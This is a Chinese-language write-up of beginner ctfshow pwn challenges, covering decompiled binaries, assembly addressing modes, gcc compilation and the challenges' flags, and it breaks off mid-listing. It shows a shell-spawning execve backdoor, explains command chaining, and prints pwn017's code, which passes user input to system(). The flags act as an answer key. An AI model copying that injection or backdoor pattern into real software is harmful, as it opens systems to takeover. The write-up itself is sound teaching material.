<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn004/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位保护全开</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 变量定义</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">11</span>]; <span class="comment">// [rsp+1h] [rbp-1Fh] BYREF  // 用于存储字符串&quot;CTFshowPWN&quot;</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">12</span>]; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF  // 用于接收用户输入</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]  // 用于存储从FS段读取的信息，可能与栈保护或调试相关</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);  <span class="comment">// 读取FS段寄存器的值</span></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);  </span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);  <span class="comment">// 通过两次setvbuf调用，禁用了_BSS段和标准输入stdin的缓冲</span></span><br><span class="line">  <span class="built_in">strcpy</span>(s1, <span class="string">&quot;CTFshowPWN&quot;</span>);  <span class="comment">// 字符串&quot;CTFshowPWN&quot;复制到s1数组</span></span><br><span class="line">  logo();  <span class="comment">// 美术</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;find the secret !&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s2);  <span class="comment">// 通过scanf函数等待用户输入一个字符串，并将其保存到s2数组中。注意，直接使用%s格式化字符串而不指定最大长度可能会导致缓冲区溢出的安全风险</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">    execve_func();  <span class="comment">// s1 s2相同就执行</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">execve_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF  读取了线程信息块中的某个值，可能用于检测堆栈是否被修改，确保安全</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]  // 用于存储FS段的原始值，可能用于安全检查或调试</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);  <span class="comment">// 读取了线程信息块中的某个值，可能用于检测堆栈是否被修改，确保安全</span></span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;  <span class="comment">// shell自身的名称</span></span><br><span class="line">  argv[<span class="number">1</span>] = <span class="number">0LL</span>;  <span class="comment">// 参数结束标志</span></span><br><span class="line">  argv[<span class="number">2</span>] = <span class="number">0LL</span>; <span class="comment">// 多余的，因为在argv[1]后已经结束</span></span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, <span class="number">0LL</span>);  <span class="comment">// 使用execve系统调用来启动一个新的程序，替换当前进程的内存空间。在这里，它启动的是Shell (/bin/sh)，并且传入了预先准备好的参数列表argv。第三个参数为0LL，意味着环境变量列表为空</span></span><br><span class="line"> <span class="comment">// 第一个参数是指向可执行文件路径的字符串，指向Shell程序</span></span><br><span class="line"> <span class="comment">// 第三个参数0LL，即(char*)NULL，意味着不传递任何环境变量给新进程</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>execve</code> 本身并不是一个后门函数。实际上， <code>execve</code> 是一个标准的系统调用函数，用于在 Linux和类 Unix 系统中执行一个新的程序。它的原型如下：<br>
<code>int execve(const char *filename, char *const argv[], char *const envp[]);</code><br>
该函数接受三个参数：</p>
<ul>
<li>filename ：要执行的程序的文件名或路径。</li>
<li>argv ：一个以 NULL 结尾的字符串数组，表示传递给新程序的命令行参数。</li>
<li>envp ：一个以 NULL 结尾的字符串数组，表示新程序的环境变量。</li>
<li>当调用 execve 函数时，它会将当前进程替换为新程序的代码，并开始执行新程序。新程序接收argv 和 envp 作为命令行参数和环境变量。</li>
<li>在加入某些参数后就可以达到我们所需要的后门函数的效果</li>
</ul>
</li>
<li>
<p>这道题就是输入<code>CTFshowPWN</code>字符串，即可获得shell，然后<code>cat /ctfshow_flag</code></p>
</li>
</ul>
<h3 id="005-012-了解寄存器、寻址方式’"><a class="header-anchor" href="#005-012-了解寄存器、寻址方式’">¶</a>005-012  了解寄存器、寻址方式’</h3>
<h4 id="汇编代码"><a class="header-anchor" href="#汇编代码">¶</a>汇编代码</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">	msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0</span><br><span class="line">section .text</span><br><span class="line">	global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11 ; 将11赋值给eax</span><br><span class="line">    add eax, 114504 ; eax加上114504</span><br><span class="line">    sub eax, 1 ; eax减去1</span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx ; 将ebx的值赋值给edx</span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, [msg] ; 将msg的地址赋值给ecx	</span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi] ; 将esi所指向的地址的值赋值给eax</span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4 ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2 ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1 ; 将1赋值给edx</span><br><span class="line">    add ecx, 8 ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4 ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1 ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22 ; 要输出的字符串的长度</span><br><span class="line">    int 0x80 ; 调用系统调用</span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1 ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx ; 返回值为0</span><br><span class="line">    int 0x80 ; 调用系统调用</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>使用NASM汇编器和ld链接器将汇编代码编译成可执行文件</p>
</li>
<li>
<p>首先，将代码保存为一个文件，例如 Welcome_CTFshow.asm 。然后，使用以下命令将其编译为对象文件↓↓↓</p>
</li>
<li>
<p><code>nasm -f elf Welcome_to_CTFshow.asm</code></p>
<ul>
<li>这将生成一个名为 <code>Welcome_CTFshow.o</code> 的对象文件。接下来，使用以下命令将对象文件链接成可执行文件</li>
<li><code>ld -m elf_i386 -s -o Welcome_to_CTFshow Welcome_to_CTFshow.o</code>
<ul>
<li>这将生成一个名为 Welcome_CTFshow 的可执行文件</li>
</ul>
</li>
</ul>
</li>
<li>
<p>用64位IDA打开<code>Welcome_to_CTFshow.o</code>，即可获得以上汇编代码</p>
</li>
<li>
<p>好抽象啊啊啊啊啊啊啊啊啊啊</p>
</li>
</ul>
<h4 id="005-运行可执行文件"><a class="header-anchor" href="#005-运行可执行文件">¶</a>005  运行可执行文件</h4>
<p><code>./Welcome_to_CTFshow</code></p>
<p>得到：<code>Welcome_to_CTFshow_PWN</code></p>
<ul>
<li><code>ctfshow&#123;Welcome_to_CTFshow_PWN&#125;</code></li>
</ul>
<h4 id="006-立即寻址方式"><a class="header-anchor" href="#006-立即寻址方式">¶</a>006  立即寻址方式</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11 ; 将11赋值给eax</span><br><span class="line">    add eax, 114504 ; eax加上114504</span><br><span class="line">    sub eax, 1 ; eax减去1</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ctfshow&#123;114514&#125;</code>  （好臭啊</li>
</ul>
<h4 id="007-寄存器寻址方式"><a class="header-anchor" href="#007-寄存器寻址方式">¶</a>007  寄存器寻址方式</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx ; 将ebx的值赋值给edx</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ctfshow&#123;0x36D&#125;</code></li>
</ul>
<h4 id="008-直接寻址方式"><a class="header-anchor" href="#008-直接寻址方式">¶</a>008  直接寻址方式</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 直接寻址方式</span><br><span class="line">	mov ecx, [msg] ; 将msg的地址赋值给ecx</span><br><span class="line">对应IDA：</span><br><span class="line">	mov ecx, dword_80490E8</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ctfshow&#123;0x80490E8&#125;</code></li>
</ul>
<h4 id="009-寄存器间接寻址方式"><a class="header-anchor" href="#009-寄存器间接寻址方式">¶</a>009  寄存器间接寻址方式</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi] ; 将esi所指向的地址的值赋值给eax</span><br><span class="line">对应IDA：</span><br><span class="line">	mov esi, offset dword_80490E8</span><br><span class="line">	mov eax, [esi]</span><br><span class="line"></span><br><span class="line">.data:080490E8 dword_80490E8 dd 696C6557h		; DATA XREF: LOAD:0804805C↑o</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ctfshow&#123;0x636C6557&#125;</code></li>
</ul>
<h4 id="010-寄存器相对寻址方式"><a class="header-anchor" href="#010-寄存器相对寻址方式">¶</a>010  寄存器相对寻址方式</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4 ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line">对应IDA：</span><br><span class="line">	mov ecx, offset dword_80490E8</span><br><span class="line">	add ecx, 4</span><br><span class="line">	mov eax, [ecx]</span><br><span class="line">	</span><br><span class="line">.data:080490E8 dword_80490E8 dd 696C6557h		; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;, 0</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>这里将msg的地址（0x80490E8）+ 4 处所执向的地址的值赋给eax</p>
</li>
<li>
<p><code>hex(0x80490E8+4)</code>    得到<code>0x80490ec</code>   也就是<code>“ome_to_CTFshow_PWN”</code></p>
</li>
<li>
<p><code>ctfshow&#123;ome_to_CTFshow_PWN&#125;</code></p>
</li>
</ul>
<h4 id="011-基址变址寻址方式"><a class="header-anchor" href="#011-基址变址寻址方式">¶</a>011  基址变址寻址方式</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2 ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line">对应IDA：</span><br><span class="line">	mov ecx, offset dword_80490E8</span><br><span class="line">	add edx, 2</span><br><span class="line">	mov eax, [ecx + edx * 2]</span><br><span class="line">	</span><br><span class="line">.data:080490E8 dword_80490E8 dd 696C6557h		; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;, 0</span><br></pre></td></tr></table></figure>
<ul>
<li>计算最终也是 [0x80490E8 + 2*2 ] = [0X80490EC]</li>
<li><code>ctfshow&#123;ome_to_CTFshow_PWN&#125;</code></li>
</ul>
<h4 id="012-相对基址变址寻址"><a class="header-anchor" href="#012-相对基址变址寻址">¶</a>012  相对基址变址寻址</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1 ; 将1赋值给edx</span><br><span class="line">    add ecx, 8 ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line">    </span><br><span class="line">对应IDA：</span><br><span class="line">	mov ecx, offset dword_80490E8</span><br><span class="line">	add edx, 2</span><br><span class="line">	mov eax, [ecx + edx * 2]</span><br><span class="line">	</span><br><span class="line">.data:080490E8 dword_80490E8 dd 696C6557h		; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;, 0</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>hex(8 + 0x80490E8 + 1*2 -6)</code>    得到<code>0x80490ec</code>   也就是<code>“ome_to_CTFshow_PWN”</code></p>
</li>
<li>
<p><code>ctfshow&#123;ome_to_CTFshow_PWN&#125;</code></p>
</li>
</ul>
<h3 id="013-gcc编译"><a class="header-anchor" href="#013-gcc编译">¶</a>013  gcc编译</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cat flag.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> flag[] = &#123;<span class="number">99</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">104</span>, <span class="number">79</span>, <span class="number">119</span>, <span class="number">95</span>, <span class="number">116</span>, <span class="number">48</span>, <span class="number">95</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">51</span>, <span class="number">95</span>, <span class="number">71</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">63</span>, <span class="number">125</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>它使用字符数组 flag 存储了一个加密的字符串，并通过 printf函数将其打印出来</p>
</li>
<li>
<p>在这段代码中， flag 数组存储了一串整数值，这些整数值代表了字符的 ASCII 码。通过将这些整数值转换为相应的字符，就可以还原出原始的字符串</p>
</li>
<li>
<p>运行该程序， printf 函数使用 %s 格式字符串将 flag 数组作为参数进行打印。由于 flag 数组的最后一个元素为零（NULL 字符），printf 函数会将其之前的字符依次打印，直到遇到 NULL 字符为止。</p>
</li>
<li>
<p>根据给定的整数值数组，还原出的字符串为： <code>ctfshow&#123;hOw_t0_us3_GCC?&#125;</code></p>
</li>
</ul>
<h3 id="014-gcc编译-c文件"><a class="header-anchor" href="#014-gcc编译-c文件">¶</a>014  gcc编译.c文件</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// flag.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 1024  </span></span><br><span class="line"><span class="comment">// 定义了缓冲区的大小为1024字节，用于读取文件内容</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    </span><br><span class="line">    fp = fopen(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;rb&quot;</span>);  <span class="comment">// 尝试以二进制只读模式(&quot;rb&quot;)打开名为&quot;key&quot;的文件</span></span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Nothing here!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> output[BUFFER_SIZE * <span class="number">9</span> + <span class="number">12</span>];  <span class="comment">// 输出字符串output的大小预留得比原始缓冲区大得多，以容纳转换后的位表示及额外的格式化字符</span></span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot;ctfshow&#123;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((n = fread(buffer, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), BUFFER_SIZE, fp)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 从打开的文件中读取数据，并将读取到的每个字节的位转换成字符串形式输出</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;  <span class="comment">// 外层的for循环(for (size_t i = 0; i &lt; n; i++))遍历了当前读取批次中的每个字节</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt;= <span class="number">0</span>; j--) &#123;  <span class="comment">// 内层的for循环(for (int j = 7; j &gt;= 0; j--))负责将每个字节的每一位转换为字符串</span></span><br><span class="line">                offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot;%d&quot;</span>, (buffer[i] &gt;&gt; j) &amp; <span class="number">1</span>);  <span class="comment">// (buffer[i] &gt;&gt; j)是对字节buffer[i]进行右移操作</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i != n - <span class="number">1</span>) &#123;  <span class="comment">// 非最后一个字节就加下划线</span></span><br><span class="line">                offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!feof(fp)) &#123;  <span class="comment">// 非文件最后一部分就加空格</span></span><br><span class="line">            offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>程序打开名为 “key” 的文件，以二进制（“rb”）模式进行读取。如果文件打开失败，将输出错误消息 “Nothing here!” 并返回 -1</p>
</li>
<li>
<p>然后，程序定义了一个缓冲区 buffer 用于读取文件内容，以及一个字符串数组 output 用于存储转换后的二进制字符串。变量 offset 用于跟踪 output 数组中的偏移量。</p>
</li>
<li>
<p>接下来，程序开始将输出字符串初始化为 “ctfshow{”，然后进入一个循环，每次读取BUFFER_SIZE 字节的数据到 buffer 中，并将其转换为二进制字符串形式。</p>
</li>
<li>
<p>在内层循环中，程序遍历当前读取的字节的每一位，从最高位到最低位。通过右移操作和位与运算，提取出每一位的值，并使用 sprintf 函数将其添加到 output 字符串中。</p>
</li>
<li>
<p>在每个字节的二进制表示结束后，如果当前字节不是最后一个字节，则在 output 字符串中添加下划线作为分隔符。</p>
</li>
<li>
<p>如果文件还未读取完毕（即文件结束符未被读取），则在 output 字符串中添加空格作为分隔符。</p>
</li>
<li>
<p>循环结束后，程序在 output 字符串中添加 “}”，表示结束标记，并使用 printf 函数将最终的转换结果打印出来。最后，程序关闭文件，并返回 0 表示成功执行。</p>
</li>
<li>
<p>该程序的作用是将二进制文件中的内容转换为二进制字符串形式，并以特定格式输出</p>
</li>
<li>
<p><code>echo &quot;CTFshow&quot;&gt;key</code>   使用<code>echo</code>工具输出到标准输出，通过重定向操作符<code>&gt;</code>，输出的内容被写入（或覆盖）到名为<code>key</code>的文件中。  创建一个含有字符串<code>CTFshow</code>的文件<code>key</code></p>
</li>
<li>
<p><code>gcc -o flag flag.c</code>   编译<code>flag.c</code>，生成一个名为<code>flag</code>的程序</p>
</li>
</ul>
<h3 id="015-编译汇编代码"><a class="header-anchor" href="#015-编译汇编代码">¶</a>015  编译汇编代码</h3>
<h4 id="汇编语言→目标文件→可执行文件"><a class="header-anchor" href="#汇编语言→目标文件→可执行文件">¶</a>汇编语言→目标文件→可执行文件</h4>
<p><code>nsam -f elf flag.asm -o flag.o</code>   将汇编代码编译为目标文件</p>
<p><code>ld -m elf_i386 -o flag flag.o</code>    将目标文件链接为可执行文件</p>
<p><code>./flag</code>   运行文件</p>
<h3 id="016-gcc编译-s文件"><a class="header-anchor" href="#016-gcc编译-s文件">¶</a>016  gcc编译.s文件</h3>
<ul>
<li>.s 文件是汇编语言源文件的一种常见扩展名。它包含了使用汇编语言编写的程序代码。</li>
<li>汇编语言是一种低级编程语言，用于直接操作计算机的指令集架构。 .s 文件通常由汇编器（Assembler）处理，将其转换为可执行文件或目标文件。</li>
<li>可以使用 gcc 命令直接编译汇编语言源文件（ .s 文件）并将其链接为可执行文件。 gcc 命令具有适用于多种语言的编译器驱动程序功能，它可以根据输入文件的扩展名自动选择适当的编译器和链接器。</li>
<li><code>gcc -o flag flag.s</code>   将.s文件编译为可执行文件</li>
</ul>
<h3 id="017-Linux基础命令的拼接"><a class="header-anchor" href="#017-Linux基础命令的拼接">¶</a>017  Linux基础命令的拼接</h3>
<ul>
<li>在Linux命令中，分号（ ; ）用于分隔多个命令，允许在一行上顺序执行多个命令。</li>
<li>当使用分号（ ; ）将命令连接在一起时，它们按照从左到右的顺序逐个执行，无论前面的命令是否成功。这意味着无论前一个命令是否成功执行，后续的命令都将被执行。</li>
<li><code>command1 ; command2 ; command3</code>
<ul>
<li>在这个例子中， command1 执行完毕后，无论成功与否，接着会执行 command2 ，然后再执command3 这样，多个命令可以按顺序在一行上执行。</li>
</ul>
</li>
<li><code>command1 &amp; command2 </code></li>
<li>也可以使用 &amp; 将两条命令拼接在一起可以实现并行执行，即这两条命令将同时在后台执行。命令之间使用 &amp; 进行分隔</li>
<li>command1 和 command2 是两个要执行的命令。通过使用 &amp; 将它们连接起来，它们将同时在后台执行。这种方式下命令的输出可能会相互混合，具体的输出顺序取决于命令的执行速度和系统资源</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn017/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位保护全开</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [rsp+Ah] [rbp-16h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="comment">/* 设置缓冲区行为。前一个可能用于清除.bss段的缓冲，后一个设置标准输入流为无缓冲模式 */</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);  </span><br><span class="line">  <span class="built_in">puts</span>(asc_D48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_DC0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_E40);</span><br><span class="line">  <span class="built_in">puts</span>(asc_ED0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_F60);</span><br><span class="line">  <span class="built_in">puts</span>(asc_FE8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_1080);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : You should understand the basic command usage of Linux! &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  *(_DWORD *)dest = <span class="number">790655852</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nHow much do you know about Linux commands? \n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nEnter the command you want choose:(1.2.3.4 or 5)\n&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        system(<span class="string">&quot;id&quot;</span>); <span class="comment">/* 使用system调用执行id命令，显示当前用户的ID和组ID */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Which directory?(&#x27;/&#x27;,&#x27;./&#x27; or the directiry you want?)&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0xA</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>(dest, buf);</span><br><span class="line">        system(dest);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Execution succeeded!&quot;</span>);</span><br><span class="line">        <span class="comment">/* 读取用户输入的目录名，并将其附加到dest，然后使用system执行ls命令列出该目录的内容 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;$cat /ctfshow_flag&quot;</span>);</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ctfshow&#123;&quot;</span>);</span><br><span class="line">        sleep(<span class="number">2u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;... ...&quot;</span>);</span><br><span class="line">        sleep(<span class="number">3u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Your flag is ...&quot;</span>);</span><br><span class="line">        